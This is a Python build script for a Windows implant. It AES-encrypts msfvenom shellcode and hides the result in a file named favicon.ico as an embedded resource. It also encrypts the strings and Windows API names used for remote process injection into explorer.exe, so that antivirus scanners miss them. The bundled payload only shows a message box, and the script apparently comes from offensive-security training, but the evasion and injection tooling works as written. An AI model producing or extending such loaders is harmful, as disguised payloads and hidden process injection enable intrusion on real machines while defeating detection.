"""
This file AES encrypts the `msgbox64.bin` file, hardcoded strings and function names
using a static AES key.

The pre-encrypted `msgbox64.bin` has been pre-encrypted and written to `favicon.ico`;
see `resource.rc` where the `favicon.ico` is embedded as a resource, loaded and
decrypted at runtime by `implant.cpp`.

The pre-encrypted strings and function names have also been copied into `implant.cpp`,
and they're also decrypted at runtime by `implant.cpp`.

The static AES key has been copied into `implant.cpp`.

Usage:
    uv venv
    .venv\Scripts\activate.bat
    pip install pycryptodome
    python aesencrypt.py
"""
import sys
from os import urandom

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

# The key is random! Everytime you run this you have to copy the output to `implant.cpp`.
KEY = get_random_bytes(16)

def print_c_str(name, value):
    print(f"unsigned char {name}[] = {{ 0x" + ", 0x".join(hex(x)[2:] for x in value) + " };")

def encrypt_AES(pt, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * b"\x00"
    plaintext = pad(pt, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(plaintext)

print_c_str("KEY", KEY)

# `msfvenom -p windows/x64/messagebox TEXT="Hello, World!" TITLE="Welcome" EXITFUNC=thread -f raw -o msgbox64.bin`
payload_filename = "msgbox64.bin"
payload_pt = b""
try:
    payload_pt = open(payload_filename, "rb").read()
except:
    print(f"Payload file '{payload_filename}' not found.")
    sys.exit()

payload_ct = encrypt_AES(payload_pt, KEY)

# Write payload ct to resource file `favicon.ico`.
favicon = "favicon.ico"
with open(favicon, "wb") as fav:
    fav.write(payload_ct)


print_c_str("sKernel32Dll", encrypt_AES(b"kernel32.dll" + b'\x00', KEY))
print_c_str("sExplorerExe", encrypt_AES(b"explorer.exe" + b'\x00', KEY))

functions = [
    b"VirtualAllocEx",
    b"WriteProcessMemory",
    b"CreateRemoteThread",
    b"CloseHandle",
    b"OpenProcess",
    b"RtlMoveMemory",
    b"VirtualAlloc",
    b"SizeofResource",
    b"LockResource",
    b"LoadResource",
    b"FindResourceA",
    b"WaitForSingleObject",
    b"lstrcmpiA",
    b"Process32Next",
    b"Process32First",
    b"CreateToolhelp32Snapshot",
    b"GetProcAddress",
    b"GetModuleHandleA",
]
for fn in functions:
    print_c_str(f"s{fn.decode()}", encrypt_AES(fn + b'\x00', KEY))
